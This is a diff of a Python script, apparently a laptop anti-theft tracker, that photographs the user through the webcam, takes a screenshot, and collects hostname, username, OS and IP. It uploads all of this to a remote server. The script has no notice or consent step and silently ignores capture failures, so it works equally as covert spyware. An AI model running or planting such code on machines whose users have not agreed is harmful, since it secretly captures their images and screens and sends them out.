@@ -1,70 +1,79 @@
 import requests
-import socket
 import platform
+import socket
 import getpass
 from datetime import datetime
-import pyautogui
 import cv2
+import pyautogui
 import os
 
-def recolectar_info():
-    try:
-        ip = requests.get('https://api.ipify.org').text
-    except:
-        ip = 'No disponible'
+# ========================
+# CONFIGURACIÓN
+# ========================
+SERVER_URL = "https://laptop-tracker-server.onrender.com/report"  # <-- tu URL real
 
-    return {
-        'hostname': socket.gethostname(),
-        'usuario': getpass.getuser(),
-        'sistema': platform.platform(),
-        'ip': ip,
-        'hora': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    }
+# ========================
+# FUNCIONES
+# ========================
 
-def capturar_webcam(nombre_archivo='webcam.jpg'):
+def capturar_webcam(path='webcam.jpg'):
     try:
         cam = cv2.VideoCapture(0)
         ret, frame = cam.read()
         if ret:
-            cv2.imwrite(nombre_archivo, frame)
+            cv2.imwrite(path, frame)
         else:
-            with open(nombre_archivo, 'wb') as f:
-                f.write(b'')  # imagen vacía
+            with open(path, 'wb') as f:
+                f.write(b'')  # vacía si no se pudo
         cam.release()
-    except Exception as e:
-        print("Error al capturar webcam:", e)
+    except:
+        with open(path, 'wb') as f:
+            f.write(b'')
 
-def capturar_pantalla(nombre_archivo='screenshot.jpg'):
+def capturar_pantalla(path='pantalla.jpg'):
     try:
         screenshot = pyautogui.screenshot()
-        screenshot.save(nombre_archivo)
-    except Exception as e:
-        print("Error al capturar pantalla:", e)
+        screenshot.save(path)
+    except:
+        with open(path, 'wb') as f:
+            f.write(b'')
+
+def recolectar_info():
+    hostname = socket.gethostname()
+    usuario = getpass.getuser()
+    sistema = f"{platform.system()} {platform.release()}"
+    ip = socket.gethostbyname(hostname)
+    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    return {
+        'hostname': hostname,
+        'usuario': usuario,
+        'sistema': sistema,
+        'ip': ip,
+        'hora': hora
+    }
 
 def enviar_reporte():
-    url = "https://laptop-tracker-server.onrender.com/report"
+    # Capturar imágenes
+    capturar_webcam("webcam.jpg")
+    capturar_pantalla("pantalla.jpg")
 
     datos = recolectar_info()
-    print("Datos recopilados:", datos)
 
-    capturar_webcam()
-    capturar_pantalla()
-
+    # Abrir imágenes en binario
     files = {
-        'imagen_webcam': open('webcam.jpg', 'rb'),
-        'captura_pantalla': open('screenshot.jpg', 'rb')
+        "imagen_webcam": open("webcam.jpg", "rb"),
+        "captura_pantalla": open("pantalla.jpg", "rb")
     }
 
     try:
-        response = requests.post(url, data=datos, files=files)
-        print("Reporte enviado. Código de respuesta:", response.status_code)
+        response = requests.post(SERVER_URL, data=datos, files=files)
+        print("Respuesta del servidor:", response.status_code)
     except Exception as e:
         print("Error al enviar reporte:", e)
 
-    # Limpieza
-    for f in ['webcam.jpg', 'screenshot.jpg']:
-        if os.path.exists(f):
-            os.remove(f)
-
+# ========================
+# EJECUCIÓN
+# ========================
 if __name__ == "__main__":
     enviar_reporte()
